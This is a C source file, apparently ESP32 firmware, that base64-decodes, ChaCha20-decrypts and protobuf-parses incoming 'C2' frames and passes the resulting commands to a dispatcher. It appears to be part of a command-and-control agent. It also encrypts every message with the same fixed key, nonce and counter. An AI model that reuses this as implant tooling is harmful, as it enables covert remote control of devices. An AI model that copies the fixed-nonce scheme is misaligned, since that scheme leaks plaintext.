// crypto.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "esp_log.h"

#include "mbedtls/chacha20.h"
#include "mbedtls/base64.h"

#include "pb_decode.h"
#include "c2.pb.h"

#include "utils.h"
#include "command.h"

static const char *TAG = "CRYPTO";

/* ============================================================
 * Compile-time security checks
 * ============================================================ */
_Static_assert(sizeof(CONFIG_CRYPTO_KEY)   - 1 == 32,
               "CONFIG_CRYPTO_KEY must be exactly 32 bytes");
_Static_assert(sizeof(CONFIG_CRYPTO_NONCE) - 1 == 12,
               "CONFIG_CRYPTO_NONCE must be exactly 12 bytes");

/* ============================================================
 * ChaCha20 encrypt/decrypt (same function)
 * ============================================================ */
unsigned char *chacha_cd(const unsigned char *data, size_t data_len)
{
    if (!data || data_len == 0) {
        ESP_LOGE(TAG, "Invalid input to chacha_cd");
        return NULL;
    }

    unsigned char *out = (unsigned char *)malloc(data_len);
    if (!out) {
        ESP_LOGE(TAG, "malloc failed in chacha_cd");
        return NULL;
    }

    unsigned char key[32];
    unsigned char nonce[12];
    uint32_t counter = 0;

    memcpy(key,   CONFIG_CRYPTO_KEY,   sizeof(key));
    memcpy(nonce, CONFIG_CRYPTO_NONCE, sizeof(nonce));

    int ret = mbedtls_chacha20_crypt(
        key,
        nonce,
        counter,
        data_len,
        data,
        out
    );

    if (ret != 0) {
        ESP_LOGE(TAG, "ChaCha20 failed (%d)", ret);
        free(out);
        return NULL;
    }

    return out; /* binary-safe */
}

/* ============================================================
 * Base64 encode
 * ============================================================ */
char *base64_encode(const unsigned char *input, size_t input_len)
{
    if (!input || input_len == 0) {
        ESP_LOGE(TAG, "Invalid input to base64_encode");
        return NULL;
    }

    size_t out_len = 4 * ((input_len + 2) / 3);
    char *out = (char *)malloc(out_len + 1);
    if (!out) {
        ESP_LOGE(TAG, "malloc failed in base64_encode");
        return NULL;
    }

    size_t written = 0;
    int ret = mbedtls_base64_encode(
        (unsigned char *)out,
        out_len + 1,
        &written,
        input,
        input_len
    );

    if (ret != 0) {
        ESP_LOGE(TAG, "base64 encode failed (%d)", ret);
        free(out);
        return NULL;
    }

    out[written] = '\0';
    return out;
}

/* ============================================================
 * Base64 decode
 * ============================================================ */
char *base64_decode(const char *input, size_t *output_len)
{
    if (!input || !output_len) {
        ESP_LOGE(TAG, "Invalid input to base64_decode");
        return NULL;
    }

    size_t in_len = strlen(input);
    size_t est_len = (in_len * 3) / 4;

    unsigned char *out = (unsigned char *)malloc(est_len + 1);
    if (!out) {
        ESP_LOGE(TAG, "malloc failed in base64_decode");
        return NULL;
    }

    int ret = mbedtls_base64_decode(
        out,
        est_len + 1,
        output_len,
        (const unsigned char *)input,
        in_len
    );

    if (ret != 0) {
        ESP_LOGE(TAG, "base64 decode failed (%d)", ret);
        free(out);
        return NULL;
    }

    /* Optional null terminator for debug */
    out[*output_len] = '\0';
    return (char *)out;
}

/* ============================================================
 * C2: Decode + decrypt + protobuf + exec (COMMON WIFI/GPRS)
 * ============================================================ */
bool c2_decode_and_exec(const char *frame)
{
    if (!frame || !frame[0]) {
        ESP_LOGW(TAG, "Empty C2 frame");
        return false;
    }

    /* Trim CR/LF/spaces at end (SIM800 sometimes adds \r) */
    char tmp[1024];
    size_t n = strnlen(frame, sizeof(tmp) - 1);
    memcpy(tmp, frame, n);
    tmp[n] = '\0';
    while (n > 0 && (tmp[n - 1] == '\r' || tmp[n - 1] == '\n' || tmp[n - 1] == ' ')) {
        tmp[n - 1] = '\0';
        n--;
    }

    ESP_LOGI(TAG, "C2 RX b64: %s", tmp);

    /* 1) Base64 decode */
    size_t decoded_len = 0;
    char *decoded = base64_decode(tmp, &decoded_len);
    if (!decoded || decoded_len == 0) {
        ESP_LOGE(TAG, "Base64 decode failed");
        free(decoded);
        return false;
    }

    /* 2) ChaCha decrypt */
    unsigned char *plain = chacha_cd((const unsigned char *)decoded, decoded_len);
    free(decoded);

    if (!plain) {
        ESP_LOGE(TAG, "ChaCha decrypt failed");
        return false;
    }

    /* 3) Protobuf decode -> c2_Command */
    c2_Command cmd = c2_Command_init_zero;
    pb_istream_t is = pb_istream_from_buffer(plain, decoded_len);

    if (!pb_decode(&is, c2_Command_fields, &cmd)) {
        ESP_LOGE(TAG, "PB decode error: %s", PB_GET_ERROR(&is));
        free(plain);
        return false;
    }

    free(plain);

    /* 4) Log + dispatch */
    ESP_LOGI(TAG, "==== C2 COMMAND ====");
    ESP_LOGI(TAG, "name: %s", cmd.command_name);
    ESP_LOGI(TAG, "argc: %d", cmd.argv_count);
    if (cmd.request_id[0]) ESP_LOGI(TAG, "req : %s", cmd.request_id);
    for (int i = 0; i < cmd.argv_count; i++) {
        ESP_LOGI(TAG, "arg[%d]=%s", i, cmd.argv[i]);
    }
    ESP_LOGI(TAG, "====================");

    process_command(&cmd);
    return true;
}
